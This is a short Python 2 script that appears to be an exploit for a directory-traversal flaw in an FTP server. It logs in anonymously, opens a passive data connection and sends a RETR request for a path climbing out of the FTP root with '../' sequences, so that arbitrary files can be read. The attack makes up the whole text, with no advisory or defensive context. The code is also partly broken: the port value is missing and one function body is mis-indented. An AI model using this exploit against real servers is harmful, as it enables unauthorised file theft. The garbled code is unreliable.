import sys, socket, re
host = ''
port = 
user = 'anonymous'
password = ''
timeout = 8
buffer_size = 8192
def get_data_port(s):
    
s.send('PASV\r\n')
    resp =  s.recv(buffer_size)

    pasv_info = re.search(u'(\d+),' * 5 + u'(\d+)', resp)

    if (pasv_info == None):
        raise Exception(resp)
                    
    return int(pasv_info.group(5)) * 256 + int(pasv_info.group(6))

def retr_file(s, filename):
    pasv_port = get_data_port(s)

    if (pasv_port == None):        
        return None    

    s.send('RETR ' + filename + '\r\n')
    resp = s.recv(8192)    

    if resp[:3] != '150': raise Exception(resp)

    print resp
    
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s2.connect((host, pasv_port))
    s2.settimeout(2.0)                                     
    resp = s2.recv(8192)
    s2.close()    

    return resp

def get_file(filename):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(timeout)

    print s.recv(buffer_size)            

    s.send('USER ' + user + '\r\n')                   
    print s.recv(buffer_size)            

    s.send('PASS ' + password + '\r\n')               
    print s.recv(buffer_size)

    print retr_file(s, filename)

    print s.recv(buffer_size)        

    s.close()

get_file('/../../../../../../[argument]')
